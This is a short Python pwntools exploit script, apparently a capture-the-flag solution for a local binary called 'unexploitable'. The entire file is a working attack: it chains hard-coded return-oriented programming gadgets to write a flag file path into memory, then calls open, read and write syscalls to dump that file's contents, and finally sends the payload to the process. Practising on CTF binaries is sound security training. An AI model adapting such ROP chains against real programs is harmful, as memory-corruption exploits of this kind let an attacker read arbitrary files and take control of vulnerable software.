#!/usr/bin/python
from pwn import *
import requests
import sys

POPRDI = 0x00000000004014a6
POPRSI = 0x00000000004015c7
POPRDX = 0x0000000000442606
SYSCALL = 0x0000000000466fd5
POPRCX = 0x00000000004a0e5e
POPRAX = 0x000000000046dc84
XORRAX = 0x0000000000425dcf

def exploit(r):
    payload = "/home/un"
    payload += "A"*8
    payload += "A"*8

    # write char 15-22
    payload += p64(POPRCX)
    payload += "able/fla"
    payload += p64(POPRDX)
    payload += "gg".ljust(8, "\x00")
    payload += p64(POPRDI)
    payload += p64(0x6c9198+15)
    payload += p64(0x434eb7)

    # write char 0-15
    payload += p64(POPRDX)
    payload += "eexploit"
    payload += p64(POPRDI)
    payload += p64(0x6c9198)
    payload += p64(0x434eb4)

    payload += p64(0x4424d6)  #mov edx, 8

    # open
    payload += p64(POPRAX)
    payload += p64(2)
    payload += p64(POPRSI)
    payload += p64(0)
    payload += p64(SYSCALL)

    # read
    payload += p64(XORRAX)    
    payload += p64(POPRDI)
    payload += p64(3)
    payload += p64(POPRSI)
    payload += p64(0x6c9198)
    payload += p64(SYSCALL)

    # write
    payload += p64(POPRAX)
    payload += p64(1)
    payload += p64(POPRDI)
    payload += p64(1)
    payload += p64(SYSCALL)

    print len(payload)
    print(base64.b64encode(payload))

    r.sendline(payload)

    r.interactive()

    return

if __name__ == "__main__":
    r = process("./unexploitable")
    print util.proc.pidof(r)
    pause()
    exploit(r)
